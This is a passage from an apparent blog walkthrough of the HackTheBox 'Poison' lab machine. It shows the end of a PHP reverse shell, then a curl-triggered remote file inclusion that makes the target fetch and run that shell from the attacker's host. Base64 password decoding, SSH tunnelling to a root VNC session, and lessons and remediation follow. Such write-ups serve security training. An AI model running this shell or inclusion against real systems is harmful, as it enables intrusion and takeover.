</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>feof</span><span class=p>(</span><span class=nv>$sock</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>printit</span><span class=p>(</span><span class=s2>&#34;ERROR: Shell connection terminated&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>feof</span><span class=p>(</span><span class=nv>$pipes</span><span class=p>[</span><span class=mi>1</span><span class=p>]))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>printit</span><span class=p>(</span><span class=s2>&#34;ERROR: Shell process terminated&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nv>$read_a</span> <span class=o>=</span> <span class=k>array</span><span class=p>(</span><span class=nv>$sock</span><span class=p>,</span> <span class=nv>$pipes</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=nv>$pipes</span><span class=p>[</span><span class=mi>2</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$num_changed_sockets</span> <span class=o>=</span> <span class=nx>stream_select</span><span class=p>(</span><span class=nv>$read_a</span><span class=p>,</span> <span class=nv>$write_a</span><span class=p>,</span> <span class=nv>$error_a</span><span class=p>,</span> <span class=k>null</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>in_array</span><span class=p>(</span><span class=nv>$sock</span><span class=p>,</span> <span class=nv>$read_a</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nv>$debug</span><span class=p>)</span> <span class=nx>printit</span><span class=p>(</span><span class=s2>&#34;SOCK READ&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nv>$input</span> <span class=o>=</span> <span class=nx>fread</span><span class=p>(</span><span class=nv>$sock</span><span class=p>,</span> <span class=nv>$chunk_size</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nv>$debug</span><span class=p>)</span> <span class=nx>printit</span><span class=p>(</span><span class=s2>&#34;SOCK: </span><span class=si>$input</span><span class=s2>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nx>fwrite</span><span class=p>(</span><span class=nv>$pipes</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=nv>$input</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>in_array</span><span class=p>(</span><span class=nv>$pipes</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=nv>$read_a</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nv>$debug</span><span class=p>)</span> <span class=nx>printit</span><span class=p>(</span><span class=s2>&#34;STDOUT READ&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nv>$input</span> <span class=o>=</span> <span class=nx>fread</span><span class=p>(</span><span class=nv>$pipes</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=nv>$chunk_size</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nv>$debug</span><span class=p>)</span> <span class=nx>printit</span><span class=p>(</span><span class=s2>&#34;STDOUT: </span><span class=si>$input</span><span class=s2>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nx>fwrite</span><span class=p>(</span><span class=nv>$sock</span><span class=p>,</span> <span class=nv>$input</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>in_array</span><span class=p>(</span><span class=nv>$pipes</span><span class=p>[</span><span class=mi>2</span><span class=p>],</span> <span class=nv>$read_a</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nv>$debug</span><span class=p>)</span> <span class=nx>printit</span><span class=p>(</span><span class=s2>&#34;STDERR READ&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nv>$input</span> <span class=o>=</span> <span class=nx>fread</span><span class=p>(</span><span class=nv>$pipes</span><span class=p>[</span><span class=mi>2</span><span class=p>],</span> <span class=nv>$chunk_size</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nv>$debug</span><span class=p>)</span> <span class=nx>printit</span><span class=p>(</span><span class=s2>&#34;STDERR: </span><span class=si>$input</span><span class=s2>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nx>fwrite</span><span class=p>(</span><span class=nv>$sock</span><span class=p>,</span> <span class=nv>$input</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>fclose</span><span class=p>(</span><span class=nv>$sock</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>fclose</span><span class=p>(</span><span class=nv>$pipes</span><span class=p>[</span><span class=mi>0</span><span class=p>]);</span>
</span></span><span class=line><span class=cl><span class=nx>fclose</span><span class=p>(</span><span class=nv>$pipes</span><span class=p>[</span><span class=mi>1</span><span class=p>]);</span>
</span></span><span class=line><span class=cl><span class=nx>fclose</span><span class=p>(</span><span class=nv>$pipes</span><span class=p>[</span><span class=mi>2</span><span class=p>]);</span>
</span></span><span class=line><span class=cl><span class=nx>proc_close</span><span class=p>(</span><span class=nv>$process</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>printit</span> <span class=p>(</span><span class=nv>$string</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nv>$daemon</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>print</span> <span class=s2>&#34;</span><span class=si>$string\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></div><h3 id=serving-the-shell>Serving the Shell</h3><p>I&rsquo;ll serve the shell file using Python&rsquo;s built-in HTTP server:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-console data-lang=console><span class=line><span class=cl><span class=gp>$</span> python3 -m http.server <span class=m>8000</span>
</span></span><span class=line><span class=cl><span class=go>Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
</span></span></span></code></pre></div><h3 id=setting-up-listener>Setting up Listener</h3><p>In another terminal, I&rsquo;ll set up a netcat listener:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-console data-lang=console><span class=line><span class=cl><span class=gp>$</span> nc -nlvp <span class=m>9001</span>
</span></span><span class=line><span class=cl><span class=go>listening on [any] 9001 ...
</span></span></span></code></pre></div><h3 id=triggering-the-rfi>Triggering the RFI</h3><p>Now I&rsquo;ll trigger the RFI by including my hosted PHP file:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-console data-lang=console><span class=line><span class=cl><span class=gp>$</span> curl <span class=s2>&#34;http://10.10.10.84/browse.php?file=http://10.10.14.13:8000/shell.php&#34;</span>
</span></span></code></pre></div><p><img alt="Triggering remote include" loading=lazy src=/images/poison-htb/poison-rfi-response.png></p><p>This gives me a shell as the <code>www</code> user:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-console data-lang=console><span class=line><span class=cl><span class=go>connect to [10.10.14.13] from (UNKNOWN) [10.10.10.84] 64838
</span></span></span><span class=line><span class=cl><span class=go>FreeBSD Poison 11.1-RELEASE FreeBSD 11.1-RELEASE #0 r321309: Fri Jul 21 02:08:28 UTC 2017     root@releng2.nyi.freebsd.org:/usr/obj/usr/src/sys/GENERIC  amd64
</span></span></span><span class=line><span class=cl><span class=go> 2:15PM  up 2 mins, 0 users, load averages: 0.09, 0.16, 0.08
</span></span></span><span class=line><span class=cl><span class=go>uid=80(www) gid=80(www) groups=80(www)
</span></span></span><span class=line><span class=cl><span class=go>/usr/local/www/apache24/data
</span></span></span><span class=line><span class=cl><span class=go></span><span class=gp>$</span> python -c <span class=s1>&#39;import pty;pty.spawn(&#34;/bin/sh&#34;)&#39;</span>
</span></span></code></pre></div><p><img alt="Interactive reverse shell" loading=lazy src=/images/poison-htb/poison-reverse-shell.png></p><h2 id=enumeration-as-www>Enumeration as www</h2><h3 id=finding-user-credentials>Finding User Credentials</h3><p>Now that I have a shell, I&rsquo;ll enumerate the system. Looking in the <code>/home</code> directory:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-console data-lang=console><span class=line><span class=cl><span class=gp>$</span> ls /home
</span></span><span class=line><span class=cl><span class=go>charix
</span></span></span><span class=line><span class=cl><span class=go></span><span class=gp>$</span> ls -la /home/charix
</span></span><span class=line><span class=cl><span class=go>total 41
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x  2 charix  charix   512 Mar 19  2018 .
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x  3 root    wheel    512 Mar 19  2018 ..
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r--  1 charix  charix    87 Mar 19  2018 .history
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r--  1 charix  charix   771 Mar 19  2018 .shrc
</span></span></span><span class=line><span class=cl><span class=go>-rw-r-----  1 charix  charix    33 Mar 19  2018 user.txt
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r--  1 root    root     166 Mar 19  2018 secret.zip
</span></span></span></code></pre></div><p>I can&rsquo;t read <code>user.txt</code> yet, but there&rsquo;s a <code>secret.zip</code> file. Let me also check the web directory:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-console data-lang=console><span class=line><span class=cl><span class=gp>$</span> ls -la /usr/local/www/apache24/data
</span></span><span class=line><span class=cl><span class=go>total 36
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x  2 www  www   512 Mar 19  2018 .
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x  3 www  www   512 Jan 24  2018 ..
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r--  1 www  www   289 Mar 19  2018 browse.php
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r--  1 www  www   289 Mar 19  2018 index.php
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r--  1 www  www    68 Mar 19  2018 info.php
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r--  1 www  www   289 Mar 19  2018 ini.php
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r--  1 www  www    78 Mar 19  2018 listfiles.php
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r--  1 www  www   935 Mar 19  2018 phpinfo.php
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r--  1 www  www    68 Mar 19  2018 pwdbackup.txt
</span></span></span></code></pre></div><p>There&rsquo;s a <code>pwdbackup.txt</code> file! Let me examine it:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-console data-lang=console><span class=line><span class=cl><span class=gp>$</span> cat pwdbackup.txt
</span></span><span class=line><span class=cl><span class=go>This password is secure, it&#39;s encoded atleast 13 times.. what could go wrong really..
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVUbGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1VWWnRjRWRUTWxKSVZsaG9XMkV4Y0hKWFZscHJWakpHYzFOc1dtRlRSbVJWVFZkU1QxWnRSblZVYmxKaFVubEtSMFpHV25SVlJFcG9aV3hhVmxkc1VsUlphbXhhVTJ0a1IxSXhWalZhUkZaS1drWmFVbGt4Vm1wU2JFRjRVVVF3UVE9PQ==
</span></span></span></code></pre></div><p>This looks like Base64 encoded data that&rsquo;s been encoded multiple times. Let me decode it:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-console data-lang=console><span class=line><span class=cl><span class=gp>$</span> <span class=nv>data</span><span class=o>=</span><span class=k>$(</span>cat pwdbackup.txt <span class=p>|</span> tail -1<span class=k>)</span><span class=p>;</span> <span class=k>for</span> i in <span class=k>$(</span>seq <span class=m>1</span> 13<span class=k>)</span><span class=p>;</span> <span class=k>do</span> <span class=nv>data</span><span class=o>=</span><span class=k>$(</span><span class=nb>echo</span> <span class=nv>$data</span> <span class=p>|</span> base64 -d<span class=k>)</span><span class=p>;</span> <span class=k>done</span><span class=p>;</span> <span class=nb>echo</span> <span class=nv>$data</span>
</span></span><span class=line><span class=cl><span class=go>Charix!2#4%6&amp;8(0
</span></span></span></code></pre></div><p><img alt="Decoded password for charix" loading=lazy src=/images/poison-htb/poison-password-decode.png></p><p>Perfect! Now I have the password for the <code>charix</code> user: <code>Charix!2#4%6&amp;8(0</code></p><h3 id=ssh-as-charix>SSH as charix</h3><p>I can now SSH into the system as <code>charix</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-console data-lang=console><span class=line><span class=cl><span class=gp>$</span> ssh charix@10.10.10.84
</span></span><span class=line><span class=cl><span class=go>Password for charix@Poison:
</span></span></span><span class=line><span class=cl><span class=go>Last login: Mon Mar 19 16:38:00 2018 from 10.10.14.4
</span></span></span><span class=line><span class=cl><span class=go>FreeBSD 11.1-RELEASE (GENERIC) #0 r321309: Fri Jul 21 02:08:28 UTC 2017
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Welcome to FreeBSD!
</span></span></span><span class=line><span class=cl><span class=go>charix@Poison:~ % cat user.txt
</span></span></span><span class=line><span class=cl><span class=go>eaacdf[...]7aa428
</span></span></span></code></pre></div><p>Now I can read the user flag. I also notice the <code>secret.zip</code> file in the home directory:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-console data-lang=console><span class=line><span class=cl><span class=go>charix@Poison:~ % ls -la
</span></span></span><span class=line><span class=cl><span class=go>total 41
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x  2 charix  charix   512 Mar 19  2018 .
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x  3 root    wheel    512 Mar 19  2018 ..
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r--  1 charix  charix    87 Mar 19  2018 .history
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r--  1 charix  charix   771 Mar 19  2018 .shrc
</span></span></span><span class=line><span class=cl><span class=go>-rw-r-----  1 charix  charix    33 Mar 19  2018 user.txt
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r--  1 root    root     166 Mar 19  2018 secret.zip
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>charix@Poison:~ % unzip secret.zip
</span></span></span><span class=line><span class=cl><span class=go>Archive:  secret.zip
</span></span></span><span class=line><span class=cl><span class=go>[secret.zip] secret password:
</span></span></span></code></pre></div><p>The zip file is password protected. Let me try the same password I just found:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-console data-lang=console><span class=line><span class=cl><span class=go>charix@Poison:~ % unzip secret.zip
</span></span></span><span class=line><span class=cl><span class=go>Archive:  secret.zip
</span></span></span><span class=line><span class=cl><span class=go>[secret.zip] secret password:
</span></span></span><span class=line><span class=cl><span class=go> extracting: secret
</span></span></span><span class=line><span class=cl><span class=go>charix@Poison:~ % file secret
</span></span></span><span class=line><span class=cl><span class=go>secret: Non-ISO extended-ASCII text
</span></span></span><span class=line><span class=cl><span class=go>charix@Poison:~ % xxd secret
</span></span></span><span class=line><span class=cl><span class=go>00000000: bdcb 7a4b 27f0 6a65 d827 2b44 7ae7 7b6d  ..zK&#39;.je.&#39;+D~.{m
</span></span></span></code></pre></div><p>This appears to be some kind of binary file. Let me keep this for later use.</p><p><img alt="Copying secrets.dump" loading=lazy src=/images/poison-htb/poison-secrets-dump.png></p><h2 id=privilege-escalation>Privilege Escalation</h2><h3 id=discovering-vnc>Discovering VNC</h3><p>Let me check what processes are running on the system:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-console data-lang=console><span class=line><span class=cl><span class=go>charix@Poison:~ % ps aux | grep -v &#34;[&#34;
</span></span></span><span class=line><span class=cl><span class=go>USER  PID %CPU %MEM    VSZ   RSS TT  STAT STARTED    TIME COMMAND
</span></span></span><span class=line><span class=cl><span class=go>root   11  0.0  0.0      0     0  -   RL   22:36   0:00.08 idle
</span></span></span><span class=line><span class=cl><span class=go>root  529  0.0  0.1  10484  2044  -   Is   22:36   0:00.01 /usr/sbin/syslogd -s
</span></span></span><span class=line><span class=cl><span class=go>root  620  0.0  0.2  56320  4032  -   I    22:36   0:00.02 /usr/local/bin/python /usr/local/bin/supervisord -c /usr/local/etc/supervisord.conf
</span></span></span><span class=line><span class=cl><span class=go>root  819  0.0  0.6  67220 12588  -   I    22:36   0:00.04 /usr/local/bin/Xvnc :1 -desktop X -httpd /usr/local/share/tightvnc/classes -auth /root/.Xauthority -geometry 1280x800 -depth 24 -rfbwait 120000 -rfbauth /root/.vnc/passwd -rfbport 5901 -localhost -nolisten tcp :1
</span></span></span><span class=line><span class=cl><span class=go>root  851  0.0  0.1   9584  2392  -   Is   22:36   0:00.01 /usr/sbin/cron -s
</span></span></span><span class=line><span class=cl><span class=go>charix 2303  0.0  0.2  19660  3352  0  I+   22:52   0:00.01 /usr/bin/su -
</span></span></span></code></pre></div><p>Interesting! There&rsquo;s a VNC server (<code>Xvnc</code>) running as root on port 5901, but it&rsquo;s bound to localhost only (<code>-localhost</code> flag). The process also uses <code>-rfbauth /root/.vnc/passwd</code> for authentication.</p><p>Let me also check what ports are listening:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-console data-lang=console><span class=line><span class=cl><span class=go>charix@Poison:~ % netstat -an | grep LISTEN
</span></span></span><span class=line><span class=cl><span class=go>tcp4       0      0 127.0.0.1.25           *.*                    LISTEN
</span></span></span><span class=line><span class=cl><span class=go>tcp4       0      0 *.80                   *.*                    LISTEN
</span></span></span><span class=line><span class=cl><span class=go>tcp6       0      0 *.80                   *.*                    LISTEN
</span></span></span><span class=line><span class=cl><span class=go>tcp4       0      0 *.22                   *.*                    LISTEN
</span></span></span><span class=line><span class=cl><span class=go>tcp6       0      0 *.22                   *.*                    LISTEN
</span></span></span><span class=line><span class=cl><span class=go>tcp4       0      0 127.0.0.1.5801         *.*                    LISTEN
</span></span></span><span class=line><span class=cl><span class=go>tcp4       0      0 127.0.0.1.5901         *.*                    LISTEN
</span></span></span><span class=line><span class=cl><span class=go>tcp4       0      0 *.110                  *.*                    LISTEN
</span></span></span><span class=line><span class=cl><span class=go>tcp6       0      0 *.110                  *.*                    LISTEN
</span></span></span><span class=line><span class=cl><span class=go>tcp4       0      0 *.119                  *.*                    LISTEN
</span></span></span><span class=line><span class=cl><span class=go>tcp6       0      0 *.119                  *.*                    LISTEN
</span></span></span></code></pre></div><p>Perfect! VNC is listening on ports 5801 (HTTP) and 5901 (VNC) on localhost. The <code>secret</code> file I found earlier is likely the VNC password file.</p><h3 id=setting-up-ssh-tunnel>Setting up SSH Tunnel</h3><p>Since VNC is only accessible from localhost, I&rsquo;ll create an SSH tunnel to access it from my attacking machine:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-console data-lang=console><span class=line><span class=cl><span class=gp>$</span> ssh -L 5901:127.0.0.1:5901 charix@10.10.10.84
</span></span></code></pre></div><p>This forwards my local port 5901 to the target&rsquo;s localhost:5901.</p><h3 id=connecting-to-vnc>Connecting to VNC</h3><p>Now I can connect to VNC using the <code>secret</code> file as the password:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-console data-lang=console><span class=line><span class=cl><span class=gp>$</span> vncviewer 127.0.0.1:5901 -passwd secret
</span></span></code></pre></div><p><img alt="Socksified VNC connection" loading=lazy src=/images/poison-htb/poison-vnc-portforward.png></p><p>The VNC connection is successful! I can see the desktop environment running as root.</p><p><img alt="Decrypting the VNC password" loading=lazy src=/images/poison-htb/poison-vnc-decrypter.png></p><p>From the VNC desktop, I can open a terminal and access the root flag:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-console data-lang=console><span class=line><span class=cl><span class=go>root@Poison:~ # cat /root/root.txt
</span></span></span><span class=line><span class=cl><span class=go>716d[...]92ba
</span></span></span></code></pre></div><p>The <code>secret</code> file contained the VNC password in the proper encrypted format that VNC expects. With VNC access as root, I have complete control over the system.</p><h2 id=this-walkthrough-demonstrated>This walkthrough demonstrated:</h2><ul><li><strong>Reconnaissance</strong>: Nmap scanning revealed SSH, SMTP, HTTP, POP3, and NNTP services running on FreeBSD.</li><li><strong>Web Enumeration</strong>: Directory brute-forcing discovered vulnerable <code>browse.php</code> file browser.</li><li><strong>LFI Exploitation</strong>: PHP filter wrappers exposed source code and enabled log poisoning attacks.</li><li><strong>Log Poisoning</strong>: Injecting PHP code into Apache access logs for remote code execution.</li><li><strong>RFI Exploitation</strong>: Remote file inclusion provided more stable shell access than log poisoning.</li><li><strong>Credential Discovery</strong>: Multiple base64 encoded password found in web directory backup file.</li><li><strong>Privilege Escalation</strong>: Process enumeration revealed VNC server running as root on localhost.</li><li><strong>SSH Tunneling</strong>: Port forwarding enabled access to localhost-bound VNC service.</li><li><strong>VNC Access</strong>: Encrypted password file provided root desktop access for flag capture.</li></ul><h2 id=key-lessons>Key Lessons:</h2><h3 id=web-application-security>Web Application Security</h3><ul><li><strong>Never store credentials in web-accessible directories</strong>: The <code>pwdbackup.txt</code> file should never have been in the web root - even with obfuscation</li><li><strong>Input validation is critical</strong>: The <code>browse.php</code> file parameter lacked proper sanitization and filtering</li><li><strong>LFI vulnerabilities are extremely dangerous</strong>: Direct file inclusion without filtering leads to immediate system compromise</li><li><strong>Directory traversal attacks are still prevalent</strong>: <code>../</code> sequences bypassed basic filtering attempts</li></ul><h3 id=log-poisoning--rfi-techniques>Log Poisoning & RFI Techniques</h3><ul><li><strong>Log poisoning is a reliable LFI escalation technique</strong>: Web server logs provide a writable target for PHP injection</li><li><strong>User-Agent headers are prime targets</strong>: HTTP headers often logged without sanitization</li><li><strong>RFI provides more stable access</strong>: Remote file inclusion offered better shell stability than log poisoning</li><li><strong>PHP filter wrappers expose source code</strong>: <code>php://filter/convert.base64-encode</code> reveals application logic</li></ul><h3 id=privilege-escalation-insights>Privilege Escalation Insights</h3><ul><li><strong>Process enumeration reveals attack surfaces</strong>: Services bound to localhost can be accessed through SSH tunneling</li><li><strong>Service isolation matters</strong>: VNC running as root violates the principle of least privilege</li><li><strong>Network service binding is security-relevant</strong>: Localhost-only binding prevented direct access but SSH tunneling bypassed this</li><li><strong>Encrypted files aren&rsquo;t always secure</strong>: The VNC password file used weak encryption easily bypassed</li></ul><h3 id=password--authentication-weaknesses>Password & Authentication Weaknesses</h3><ul><li><strong>Multiple encoding layers don&rsquo;t provide security</strong>: Obfuscation through repeated base64 encoding is easily defeated</li><li><strong>Password reuse is dangerous</strong>: The same password worked for multiple services and files</li><li><strong>Weak VNC authentication</strong>: Simple password-based VNC access provided full root desktop control</li><li><strong>Credential discovery through enumeration</strong>: Systematic file enumeration revealed multiple password sources</li></ul><h3 id=system-administration-failures>System Administration Failures</h3><ul><li><strong>Unnecessary services increase attack surface</strong>: VNC server wasn&rsquo;t required for normal operations</li><li><strong>Backup files contain sensitive data</strong>: The backup directory exposed critical system information</li><li><strong>File permissions were overly permissive</strong>: Many files readable by web server process</li><li><strong>Default configurations often insecure</strong>: Services running with excessive privileges by default</li></ul><h2 id=remediation>Remediation:</h2><ul><li>Implement proper input validation and sanitization for all file parameters</li><li>Use whitelist-based file access instead of direct inclusion</li><li>Remove backup files and credentials from web-accessible directories</li><li>Configure services to run with minimal required privileges</li><li>Implement proper network segmentation and access controls</li><li>Use strong authentication mechanisms instead of simple password files</li><li>Regular security audits to identify exposed services and misconfigurations</li></ul><p>Happy hacking!</p></div><footer class=post-footer><ul class=share-buttons><li><a target=_blank rel="noopener noreferrer" aria-label="share  on x" href="https://x.com/intent/tweet/?text=&amp;url=https%3a%2f%2frealspaceeagle.github.io%2fposts%2fhackthebox-poison-walkthrough%2f&amp;hashtags="><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446C483.971.0 512 28.03 512 62.554zM269.951 190.75 182.567 75.216H56L207.216 272.95 63.9 436.783h61.366L235.9 310.383l96.667 126.4H456L298.367 228.367l134-153.151H371.033zM127.633 110h36.468l219.38 290.065H349.5z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share  on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2frealspaceeagle.github.io%2fposts%2fhackthebox-poison-walkthrough%2f&amp;title=&amp;summary=&amp;source=https%3a%2f%2frealspaceeagle.github.io%2fposts%2fhackthebox-poison-walkthrough%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share  on reddit" href="https://reddit.com/submit?url=https%3a%2f%2frealspaceeagle.github.io%2fposts%2fhackthebox-poison-walkthrough%2f&title="><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share  on whatsapp" href="https://api.whatsapp.com/send?text=%20-%20https%3a%2f%2frealspaceeagle.github.io%2fposts%2fhackthebox-poison-walkthrough%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 